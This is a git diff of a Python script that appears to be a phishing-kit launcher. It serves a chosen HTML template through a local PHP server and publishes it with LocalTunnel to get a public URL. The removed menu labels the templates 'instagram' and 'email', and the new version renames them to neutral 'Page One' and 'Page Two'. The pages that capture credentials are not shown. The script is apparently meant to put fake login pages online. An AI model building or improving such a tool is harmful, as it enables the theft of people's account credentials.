@@ -1,7 +1,19 @@
 import os
 import sys
-import time
 import subprocess
+import logging
+import time
+
+# -------- Auto-install modules if missing --------
+def install(package):
+    os.system(f"{sys.executable} -m pip install {package}")
+
+try:
+    from flask import Flask, send_from_directory
+except ModuleNotFoundError:
+    print("Installing Flask...")
+    install("flask")
+    from flask import Flask, send_from_directory
 
 # -------- Colors --------
 red = '\033[1;31m'
@@ -11,10 +23,14 @@ cyan = '\033[1;36m'
 pink = '\033[1;35m'
 reset = '\033[0m'
 
+# -------- Suppress default Flask logs --------
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+
 # -------- Banner --------
 def banner():
     os.system("clear")
-    print(f"""{cyan}
+    print(f"""{red}
 ██████╗ ██████╗  ██████╗     {cyan}██████╗ 
 ██╔══██╗██╔══██╗██╔═══██╗    {cyan}██╔══██╗
 ██████╔╝██████╔╝██║   ██║    {cyan}██████╔╝
@@ -26,88 +42,70 @@ def banner():
     print(f"{ylo} PRO D  |  Made by Dhani")
     print(f"{pink}══════════════════════════════════════{reset}\n")
 
-# -------- Check and install packages --------
-def check_command(cmd, install_cmd=None):
-    try:
-        subprocess.run([cmd, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except FileNotFoundError:
-        if install_cmd:
-            print(f"{ylo}{cmd} not found. Installing...{reset}")
-            os.system(install_cmd)
-        else:
-            print(f"{red}{cmd} is required but not found. Exiting.{reset}")
-            sys.exit()
+# -------- Flask App --------
+app = Flask(__name__)
+selected_html = "1.html"  # default HTML file
 
-# Check PHP
-check_command("php", install_cmd="pkg install php -y" if "termux" in sys.executable else None)
+@app.route('/')
+def home():
+    return send_from_directory(".", selected_html)
 
-# Check Node.js
-check_command("node", install_cmd="pkg install nodejs -y" if "termux" in sys.executable else None)
+# -------- Start PHP server in background --------
+def start_php_server():
+    print(f"{grn}Starting PHP server on http://127.0.0.1:8080 ...{reset}")
+    if os.name == "nt":  # Windows
+        subprocess.Popen(["php", "-S", "127.0.0.1:8080"], shell=True)
+    else:  # Linux / Termux / Mac
+        subprocess.Popen(["php", "-S", "127.0.0.1:8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-# Check LocalTunnel
-try:
-    subprocess.run(["lt", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-except FileNotFoundError:
-    print(f"{ylo}LocalTunnel not found. Installing via npm...{reset}")
-    os.system("npm install -g localtunnel")
+# -------- Start LocalTunnel and get public URL --------
+def start_localtunnel():
+    print(f"{grn}Starting LocalTunnel to get public URL...{reset}")
+    process = subprocess.Popen(
+        ["lt", "--port", "8080"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True
+    )
 
-# -------- Choose template --------
-banner()
-print(f"""{pink}
-╔══════════════════════════════╗
-║ {cyan}Choose Page Template{pink}        
-╠══════════════════════════════╣
-║ [1] instagram                 
-║ [2] email                
-╚══════════════════════════════╝
-{reset}""")
-choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
-selected_html = "1.html" if choice == "1" else "2.html"
-
-# -------- PHP Server --------
-php_port = 8080
-php_command = ["php", "-S", f"127.0.0.1:{php_port}"]
-
-print(f"{grn}Starting PHP server on http://127.0.0.1:{php_port} ...{reset}")
-php_process = subprocess.Popen(php_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-# -------- Wait a little for server to start --------
-time.sleep(2)
-
-# -------- LocalTunnel --------
-print(f"{grn}Starting LocalTunnel to get public URL...{reset}")
-lt_process = subprocess.Popen(
-    ["lt", "--port", str(php_port)],
-    stdout=subprocess.PIPE,
-    stderr=subprocess.PIPE,
-    text=True
-)
-
-public_url = None
-while True:
-    line = lt_process.stdout.readline()
-    if line:
-        print(line.strip())  # show log
-        if "your url is:" in line.lower():
-            public_url = line.split()[-1]
+    public_url = None
+    while True:
+        line = process.stdout.readline()
+        if not line:
             break
-    else:
-        time.sleep(0.1)
+        if "https://" in line:
+            public_url = line.strip()
+            break
 
-print(f"""{grn}
+    if public_url:
+        print(f"""{grn}
 ╔═══════════════════════════════════╗
-║ {cyan}SERVER RUNNING...               {grn}
+║ {cyan}SERVER RUNNING...               {grn}║
 ╠═══════════════════════════════════╣
-║ {ylo}Local: http://127.0.0.1:{php_port}{grn}   
-║ {ylo}Public: {public_url}{grn}        
+║ {ylo}Local: http://127.0.0.1:8080       {grn}║
+║ {ylo}Public: {public_url}       {grn}║
 ╚═══════════════════════════════════╝
 {reset}""")
+    else:
+        print(f"{red}Failed to get public URL from LocalTunnel.{reset}")
 
-# -------- Keep script running --------
-try:
-    php_process.wait()
-    lt_process.wait()
-except KeyboardInterrupt:
-    print(f"{red}\nStopping server...{reset}")
-    php_process.terminate()
-    lt_process.terminate()
+# -------- Main --------
+if __name__ == "__main__":
+    banner()
+
+    # Choose template
+    print(f"""{pink}
+╔══════════════════════════════╗
+║ {cyan}Choose Page Template{pink}        ║
+╠══════════════════════════════╣
+║ [1] Page One                  ║
+║ [2] Page Two                  ║
+╚══════════════════════════════╝
+{reset}""")
+    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
+    selected_html = "1.html" if choice == "1" else "2.html"
+
+    # Start PHP server and LocalTunnel
+    start_php_server()
+    time.sleep(2)  # give server time to start
+    start_localtunnel()
